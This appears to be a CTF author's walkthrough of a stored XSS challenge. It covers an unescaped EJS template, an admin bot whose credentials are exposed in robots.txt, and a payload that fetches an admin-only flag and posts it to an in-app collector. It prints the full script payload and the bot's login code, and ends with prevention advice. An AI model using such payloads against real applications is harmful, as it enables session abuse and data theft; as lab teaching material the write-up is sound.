# Ticket to the Vault: Deep Technical Explanation

## How This XSS Attack Works

## Why This IS a Medium-Level Challenge

This challenge is appropriately rated as **medium** because it requires understanding:
1. **Stored XSS** (not just reflected XSS)
2. **Same-origin policy** and authenticated requests
3. **Session management** and cookie handling
4. **JavaScript fetch API** for making authenticated requests
5. **Exfiltration techniques** (in-app capture system)
6. **Timing** (waiting for admin bot)
7. **User ID enumeration** (figuring out your user_id)

It's **not beginner** because:
- Requires JavaScript knowledge
- Requires understanding of HTTP requests and authentication
- Requires understanding of browser security model

It's **not expert** because:
- The vulnerability is obvious (unescaped output)
- No WAF bypass needed
- No encoding/obfuscation required
- Clear attack path

---

## Detailed Attack Flow: Step by Step

### Phase 1: Understanding the Vulnerability

#### The Vulnerable Code
```ejs
<!-- views/admin_tickets.ejs line 25 -->
<div class="ticket-body"><%- t.message %></div>
```

**What `<%- %>` does:**
- In EJS, `<%= %>` escapes HTML (safe)
- `<%- %>` outputs raw HTML (dangerous)
- This means `<script>alert(1)</script>` becomes actual HTML, not text

**Why it's dangerous:**
- When the browser renders this HTML, it sees a `<script>` tag
- The browser's JavaScript engine executes the script
- This happens in the **context of whoever views the page**

### Phase 0: Credential Discovery

**Before the attack, students must discover credentials:**

1. Students see login page without credentials
2. Hint suggests checking "standard web files"
3. Students think about common web files → `robots.txt`
4. Visit `/robots.txt` and find credentials in comments:
   ```
   # CTF Discovery: Default user credentials
   # Tokyo: tokyo / rio123
   # The Professor: admin / admin123
   ```
5. Use credentials to login as Tokyo

**Why robots.txt:**
- Standard file that web applications expose
- Commonly checked by web crawlers and security researchers
- CTF-appropriate hiding place
- Requires thinking about web application structure

### Phase 2: The Attack Execution

#### Step 1: User Submits Malicious Ticket
```
POST /tickets/new
Body: { subject: "Test", message: "<script>fetch('/admin/flag')...</script>" }
```

**What happens:**
1. Server receives the ticket
2. Stores it in database: `INSERT INTO tickets (user_id, subject, message) VALUES (1, 'Test', '<script>...')`
3. The JavaScript is stored as **plain text** in the database
4. No sanitization occurs

#### Step 2: Admin Bot Views Tickets

**Admin Bot Flow (bot/bot.js):**
```javascript
// 1. Bot logs in as admin
await page.goto('/auth/login');
await page.fill('input[name="username"]', 'admin');
await page.fill('input[name="password"]', 'admin123');
await page.click('button[type="submit"]');

// 2. Bot visits admin dashboard
await page.goto('/admin/tickets');
```

**What happens on the server:**
1. Server checks: `requireLogin` → admin is logged in ✓
2. Server checks: `requireAdmin` → admin has admin role ✓
3. Server queries database: `SELECT * FROM tickets`
4. Server renders template with ticket data
5. **Critical moment:** `<%- t.message %>` outputs the raw JavaScript

**The rendered HTML looks like:**
```html
<div class="ticket-body">
  <script>
    fetch('/admin/flag')
      .then(r => r.text())
      .then(flag => {
        fetch('/collector', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id: 1, data: flag })
        });
      });
  </script>
</div>
```

#### Step 3: Browser Executes JavaScript

**What happens in the admin's browser:**
1. Browser receives the HTML from server
2. Browser parses the HTML and finds `<script>` tag
3. Browser's JavaScript engine executes the script
4. **Critical:** This JavaScript runs with the **admin's session cookies**

**Same-Origin Policy:**
- The script runs on `http://localhost:5002`
- The fetch requests go to `http://localhost:5002/admin/flag`
- Same origin = cookies are automatically included
- No CORS issues because it's same-origin

#### Step 4: JavaScript Makes Authenticated Request

**The fetch request:**
```javascript
fetch('/admin/flag')
```

**What happens:**
1. Browser creates HTTP request to `/admin/flag`
2. Browser **automatically includes** admin's session cookie
3. Server receives request with admin's session
4. Server checks: `requireLogin` → session valid ✓
5. Server checks: `requireAdmin` → role is admin ✓
6. Server responds with flag: `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`

**Why this works:**
- The JavaScript runs in the admin's browser context
- The browser automatically sends cookies for same-origin requests
- The server sees a valid admin session
- The server returns the flag

#### Step 5: Exfiltration to Collector

**The second fetch:**
```javascript
fetch('/collector', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user_id: 1, data: flag })
});
```

**What happens:**
1. JavaScript receives the flag from previous fetch (e.g., `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`)
2. Makes POST request to `/collector` endpoint
3. Sends flag with attacker's `user_id: 1`
4. Server checks if this is a flag (contains "FLAG{")
5. If it's a flag, server checks if user already captured it
6. If already captured, server returns success without inserting duplicate
7. If not captured yet, server stores in database: `INSERT INTO captures (user_id, data) VALUES (1, 'FLAG{THE_BOT_DID_THE_DIRTY_WORK}')`

**Duplicate Prevention:**
- The collector endpoint prevents duplicate flag captures
- Once a user has captured the flag, subsequent bot visits won't create duplicate entries
- This ensures clean capture logs and prevents spam

**Why user_id matters:**
- The attacker (tokyo) has `user_id: 1`
- The flag is stored linked to user_id 1
- When tokyo visits `/my-captures`, they see their captures

#### Step 6: Attacker Retrieves Flag

**Attacker visits:**
```
GET /my-captures
```

**Server response:**
```sql
SELECT id, captured_at, data 
FROM captures 
WHERE user_id = 1  -- tokyo's user_id
ORDER BY id DESC
```

**Result:**
- Attacker sees the captured flag in their captures page
- Challenge solved!

---

## Why This is Medium Difficulty

### What Makes It Challenging:

1. **Understanding Same-Origin Policy**
   - Players must understand that JavaScript runs with the page's cookies
   - Not obvious that same-origin requests include cookies automatically
   - Requires understanding of browser security model

2. **Stored vs Reflected XSS**
   - Stored XSS is more complex than reflected
   - Requires understanding persistence
   - Must wait for admin to view (timing element)

3. **Authenticated Request Chain**
   - Must understand that JavaScript can make authenticated requests
   - Must understand session cookies are sent automatically
   - Must craft payload that makes multiple requests

4. **User ID Enumeration**
   - Must figure out your own user_id
   - Not immediately obvious
   - May require trial and error

5. **Exfiltration Method**
   - Must understand the `/collector` endpoint
   - Must format JSON correctly
   - Must link capture to your user_id

6. **Timing and Patience**
   - Must wait for admin bot (8 seconds)
   - Must understand the bot workflow
   - May need to troubleshoot timing issues

### What Makes It NOT Expert Level:

1. **No WAF Bypass**
   - No filters to bypass
   - No encoding needed
   - Direct script injection works

2. **Clear Vulnerability**
   - Unescaped output is obvious
   - No hidden vulnerabilities
   - Straightforward attack path

3. **No Obfuscation**
   - Standard JavaScript works
   - No need for advanced techniques
   - No CSP to bypass

4. **Helpful Endpoints**
   - `/collector` is designed for exfiltration
   - `/my-captures` makes retrieval easy
   - Clear CTF-friendly design

---

## How to Make It Harder (If Needed)

If you want to increase difficulty, consider:

### 1. Add Content Security Policy (CSP)
```javascript
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "default-src 'self'");
  next();
});
```
**Challenge:** Players must bypass CSP (use nonce, JSONP, etc.)

### 2. Add Input Sanitization
```javascript
const DOMPurify = require('isomorphic-dompurify');
// Sanitize but leave some bypass
```
**Challenge:** Players must find sanitization bypass

### 3. Hide the Collector Endpoint
- Remove `/my-captures` page
- Make players use external exfiltration (webhook, DNS, etc.)
- Or hide collector in source code

### 4. Add WAF/Filter
```javascript
if (message.includes('<script>')) {
  return res.status(400).send('XSS detected!');
}
```
**Challenge:** Players must encode/obfuscate payload

### 5. Require Cookie Theft
- Remove same-origin advantage
- Make flag endpoint on different origin
- Require stealing session cookie first

### 6. Add Rate Limiting
- Limit ticket creation
- Limit admin bot visits
- Add delays

### 7. Obfuscate the Vulnerability
- Use different template engine
- Hide unescaped output in helper function
- Make it less obvious

---

## Real-World Context

### Why This Matters:

**This attack is realistic because:**
1. **Stored XSS is common** in real applications
2. **Admin interfaces** are often vulnerable
3. **Unescaped output** is a frequent mistake
4. **Same-origin authenticated requests** are a real threat

**Real-world impact:**
- Steal admin credentials
- Access sensitive data
- Perform admin actions
- Escalate privileges
- Data exfiltration

**How to prevent:**
1. Always use `<%= %>` (escaped output) in templates
2. Implement Content Security Policy (CSP)
3. Sanitize user input
4. Use parameterized queries (already done here)
5. Implement proper authentication checks
6. Use HttpOnly cookies (already done here)
7. Add SameSite cookie attribute

---

## Summary

This challenge is **appropriately medium** because:

✅ **Requires understanding of:**
- Stored XSS
- Same-origin policy
- Authenticated requests
- JavaScript fetch API
- Session management
- Exfiltration techniques

✅ **Not too simple because:**
- Multiple steps required
- Timing element
- User ID enumeration
- Understanding browser security

✅ **Not too hard because:**
- Clear vulnerability
- No filters to bypass
- Helpful endpoints provided
- Straightforward attack path

This is a **well-designed medium challenge** that teaches important web security concepts without being frustratingly difficult or trivially easy.

